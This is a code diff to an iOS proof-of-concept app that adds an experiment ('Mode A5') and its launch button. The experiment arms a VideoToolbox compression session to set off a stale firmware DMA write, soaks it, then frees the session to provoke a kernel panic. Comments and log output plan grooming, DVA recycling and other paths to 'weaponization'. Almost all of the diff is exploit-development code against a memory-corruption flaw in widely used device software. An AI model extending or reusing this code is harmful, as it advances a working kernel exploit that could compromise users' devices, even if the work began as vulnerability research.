@@ -5334,6 +5334,189 @@ static void runExp4_CoTenancy(void) {
 }
 
 // ============================================================
+// MODE A5: PIVOTAL FORK — fire with session alive (no free)
+//
+// QUESTION: does the deferred DMA write escape the session's
+// own mapped pages? If yes → adjacent-page groom (easy path).
+// If no → write is in-bounds, need DVA recycle (hard path).
+//
+// Corpus evidence: panics 1, 2, 8 (Run C) fired with session
+// alive — hit PTE 0x1fb/0x1c4 (not the freed-session 0x20b).
+// But those were early code. This is the clean confirmation.
+//
+// ORACLE:
+//   panic  → fire escapes session; targets stale/adjacent pages
+//            even while session is alive. Groom victim next to arm.
+//   survive → fire only targets session's own pages (DMA in-bounds).
+//            weaponization needs DVA recycle to remap target page.
+// ============================================================
+
+#define A5_SOAK_SECS 300
+
+static void runExp5_PivotalFork(void) {
+    if (g_exp3Running) {
+        INFO(@"Experiment already running");
+        return;
+    }
+    g_exp3Running = YES;
+
+    pocLog(@"");
+    pocLog(@"╔═══════════════════════════════════════════╗");
+    pocLog(@"║  MODE A5: PIVOTAL FORK — NO FREE          ║");
+    pocLog(@"║  Arm stays alive → does fire still hit?    ║");
+    pocLog(@"║  *** MAY CAUSE KERNEL PANIC ***            ║");
+    pocLog(@"╚═══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    exp3Mark(@"A5-START");
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
+    NSDateFormatter *tsFmt = [[NSDateFormatter alloc] init];
+    tsFmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // ---- ARM ----
+    LOG(@"═══ A5: ARM (AlphaLayerID=255) — SESSION STAYS ALIVE ═══");
+    g_exp3Armed = NO;
+    g_exp3EncodeStatus = 0;
+
+    NSString *armTS = [tsFmt stringFromDate:[NSDate date]];
+    VTCompressionSessionRef armSession = exp3CreateSession(
+        (void *)exp3ArmCallback, YES);
+    if (!armSession) {
+        FAIL(@"Could not create arm session");
+        g_exp3Running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        return;
+    }
+    exp3Mark([NSString stringWithFormat:@"A5-arm-created-%@", armTS]);
+    PASS(@"Arm session created at %@", armTS);
+
+    CVPixelBufferRef armPB = exp3CreatePixelBuffer(0x80, 0x80);
+    if (!armPB) {
+        FAIL(@"Arm pixel buffer failed");
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        g_exp3Running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        return;
+    }
+
+    CMTime armPTS = CMTimeMake(0, 30);
+    OSStatus encStatus = VTCompressionSessionEncodeFrame(armSession, armPB,
+        armPTS, kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"Arm EncodeFrame: %d", (int)encStatus);
+
+    VTCompressionSessionCompleteFrames(armSession, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    if (!g_exp3Armed) {
+        FAIL(@"Arm not detected (status %d)", g_exp3EncodeStatus);
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        CVPixelBufferRelease(armPB);
+        g_exp3Running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        return;
+    }
+
+    NSString *armedTS = [tsFmt stringFromDate:[NSDate date]];
+    exp3Mark([NSString stringWithFormat:@"A5-armed-%@", armedTS]);
+    PASS(@"Armed — -17691 confirmed at %@", armedTS);
+
+    // ---- NO FREE — session stays alive, PTEs remain mapped ----
+    LOG(@"");
+    LOG(@"*** SESSION NOT FREED — PTEs STAY MAPPED ***");
+    LOG(@"*** If firmware DMA fires, it either:           ***");
+    LOG(@"***   hits session's own pages (DMA in-bounds)  ***");
+    LOG(@"***   OR escapes to adjacent/stale pages        ***");
+    LOG(@"***   (panic = escape, survive = in-bounds)     ***");
+    LOG(@"");
+
+    NSDate *armTime = [NSDate date];
+
+    // ---- SOAK ----
+    LOG(@"═══ A5: SOAK %ds — session ALIVE ═══", A5_SOAK_SECS);
+    LOG(@"Panic at ~T+156 = fire escapes session pages");
+    LOG(@"Survive T+%d = fire is in-bounds of session's mapping", A5_SOAK_SECS);
+
+    for (int sec = 0; sec < A5_SOAK_SECS; sec += 5) {
+        [NSThread sleepForTimeInterval:5.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:armTime];
+        NSString *ts = [tsFmt stringFromDate:[NSDate date]];
+        if (sec < 180 || sec % 30 == 0) {
+            INFO(@"T+%03ds: alive (session LIVE) %@", elapsed, ts);
+        }
+        if (sec % 60 == 0) {
+            exp3Mark([NSString stringWithFormat:@"A5-soak-T+%d-%@", elapsed, ts]);
+        }
+    }
+
+    PASS(@"*** A5: SURVIVED T+%d WITH SESSION ALIVE ***", A5_SOAK_SECS);
+    exp3Mark(@"A5-SOAK-SURVIVED");
+    LOG(@"");
+    LOG(@"═══════════════════════════════════════════════");
+    LOG(@"VERDICT: Fire is IN-BOUNDS of session's own mapping.");
+    LOG(@"The stale DMA writes into the session's coded-output buffer,");
+    LOG(@"which is still mapped and valid. No DART trap.");
+    LOG(@"");
+    LOG(@"IMPLICATION: weaponization requires EITHER:");
+    LOG(@"  1) DVA recycle — remap target page to controlled data");
+    LOG(@"  2) Partial unmap — find a path that unmaps some surfaces");
+    LOG(@"     while keeping the session alive (power mgmt? codec reset?)");
+    LOG(@"  3) Adjacent write — if firmware writes to page N+1 or N-1");
+    LOG(@"     that belongs to another session/subsystem");
+    LOG(@"═══════════════════════════════════════════════");
+
+    NSString *resultStr = [NSString stringWithFormat:
+        @"A5 PIVOTAL FORK — SURVIVED (session alive)\n"
+        @"Date: %@\nSoak: %ds\n"
+        @"Verdict: fire is in-bounds; need DVA recycle for weaponization\n",
+        [NSDate date], A5_SOAK_SECS];
+    NSString *resultPath = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/a5_result.txt"];
+    [resultStr writeToFile:resultPath atomically:YES
+                  encoding:NSUTF8StringEncoding error:nil];
+
+    // NOW free the session to confirm panic fires post-free
+    LOG(@"");
+    LOG(@"═══ A5 PHASE 2: FREE SESSION — confirm panic fires ═══");
+    NSString *freeTS = [tsFmt stringFromDate:[NSDate date]];
+    VTCompressionSessionInvalidate(armSession);
+    CFRelease(armSession);
+    CVPixelBufferRelease(armPB);
+    exp3Mark([NSString stringWithFormat:@"A5-freed-%@", freeTS]);
+    PASS(@"Session freed at %@. Waiting 180s for confirmation panic.", freeTS);
+
+    NSDate *freeTime = [NSDate date];
+    for (int sec = 0; sec < 180; sec += 5) {
+        [NSThread sleepForTimeInterval:5.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+        NSString *ts = [tsFmt stringFromDate:[NSDate date]];
+        INFO(@"T+%03ds post-free: alive %@", elapsed, ts);
+    }
+
+    PASS(@"A5 PHASE 2: survived 180s post-free too — no fire at all?!");
+    LOG(@"This would mean the fire is one-shot and was absorbed by session.");
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
+
+    exp3FreeSamples();
+    exp3Mark(@"A5-COMPLETE");
+    g_exp3Running = NO;
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -5911,33 +6094,45 @@ static void runTier2Probe(void) {
     [dPrep2Btn addTarget:self action:@selector(runDPrep2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:dPrep2Btn];
 
-    // Experiment row 10: A3 spray + A4 co-tenancy (two buttons)
+    // Experiment row 10: A3 + A4 + A5 (three buttons)
     CGFloat row10 = row9 + btnH + gap;
-    CGFloat expBtnW = (w - pad * 2 - gap) / 2;
+    CGFloat expBtnW3 = (w - pad * 2 - gap * 2) / 3;
 
     UIButton *exp3Btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    exp3Btn.frame = CGRectMake(pad, row10, expBtnW, btnH);
+    exp3Btn.frame = CGRectMake(pad, row10, expBtnW3, btnH);
     exp3Btn.backgroundColor = [UIColor colorWithRed:0.4 green:0.3 blue:0.0 alpha:1];
     exp3Btn.layer.cornerRadius = 8;
     exp3Btn.layer.borderWidth = 2;
     exp3Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1].CGColor;
-    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
-    [exp3Btn setTitle:@"A3: PTE Spray" forState:UIControlStateNormal];
+    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
+    [exp3Btn setTitle:@"A3: Spray" forState:UIControlStateNormal];
     [exp3Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1] forState:UIControlStateNormal];
     [exp3Btn addTarget:self action:@selector(runExp3) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:exp3Btn];
 
     UIButton *a4Btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    a4Btn.frame = CGRectMake(pad + expBtnW + gap, row10, expBtnW, btnH);
+    a4Btn.frame = CGRectMake(pad + expBtnW3 + gap, row10, expBtnW3, btnH);
     a4Btn.backgroundColor = [UIColor colorWithRed:0.5 green:0.0 blue:0.3 alpha:1];
     a4Btn.layer.cornerRadius = 8;
     a4Btn.layer.borderWidth = 2;
     a4Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.2 blue:0.8 alpha:1].CGColor;
-    a4Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
-    [a4Btn setTitle:@"A4: Co-Tenant" forState:UIControlStateNormal];
+    a4Btn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
+    [a4Btn setTitle:@"A4: CoTen" forState:UIControlStateNormal];
     [a4Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.2 blue:0.8 alpha:1] forState:UIControlStateNormal];
     [a4Btn addTarget:self action:@selector(runA4CoTenancy) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:a4Btn];
+
+    UIButton *a5Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    a5Btn.frame = CGRectMake(pad + (expBtnW3 + gap) * 2, row10, expBtnW3, btnH);
+    a5Btn.backgroundColor = [UIColor colorWithRed:0.0 green:0.3 blue:0.5 alpha:1];
+    a5Btn.layer.cornerRadius = 8;
+    a5Btn.layer.borderWidth = 2;
+    a5Btn.layer.borderColor = [UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1].CGColor;
+    a5Btn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
+    [a5Btn setTitle:@"A5: NoFree" forState:UIControlStateNormal];
+    [a5Btn setTitleColor:[UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1] forState:UIControlStateNormal];
+    [a5Btn addTarget:self action:@selector(runA5PivotalFork) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:a5Btn];
 
     CGFloat logTop = row10 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
@@ -6093,6 +6288,12 @@ static void runTier2Probe(void) {
 - (void)runA4CoTenancy {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runExp4_CoTenancy();
+    });
+}
+
+- (void)runA5PivotalFork {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runExp5_PivotalFork();
     });
 }
 
